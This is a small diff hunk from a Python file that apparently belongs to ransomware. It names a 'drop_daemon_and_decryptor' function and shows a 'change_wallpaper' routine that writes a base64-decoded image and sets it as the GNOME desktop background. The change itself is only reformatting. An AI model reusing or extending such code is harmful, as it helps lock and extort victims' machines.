@@ -181,8 +181,7 @@ def drop_daemon_and_decryptor():
 
 
 def change_wallpaper():
-    with open(variables.img_path,
-              'wb') as f:
+    with open(variables.img_path, 'wb') as f:
         f.write(base64.b64decode(variables.img))
     gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
             .format(variables.img_path)
